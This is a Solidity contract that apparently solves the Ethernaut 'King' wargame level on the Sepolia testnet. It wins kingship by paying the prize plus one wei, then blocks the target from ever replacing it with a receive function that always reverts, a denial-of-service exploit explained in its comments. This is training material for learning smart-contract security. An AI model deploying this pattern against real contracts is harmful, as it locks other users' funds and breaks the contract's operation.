//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../src/utils/SepoliaInstances.sol";

interface IKing {
    function prize() external view returns (uint256);
}


contract KingSolution is SepoliaInstances {

    address public king;
    constructor (address _king) payable {
        king = _king;
    }

    

    // The King contract sets the king to the last person who sent eth to the contract
    // before that an external call to the last king is made
    // The assumption is that the level can be solved is if the exploiter contract can remain
    // king forever. This is achievable via a DOS attack on the King contract by forcing a
    // revert on the transfer to the attacker Contract. The receive function simply needs to revert

    function becomeKing() public payable {
        // send more eth than the current king has to the contract
        // to become king

        // will run out of gas
        // payable(king).transfer(address(this).balance);

        uint256 amountToSend = IKing(king).prize() + 1;
        require(amountToSend <= address(this).balance, "Not enough balance");

        (bool sent, bytes memory data) = king.call{value: amountToSend}("");
    }

    receive() external payable {
        // revert to prevent the king from being changed
        revert("I am the king forever");
    }
}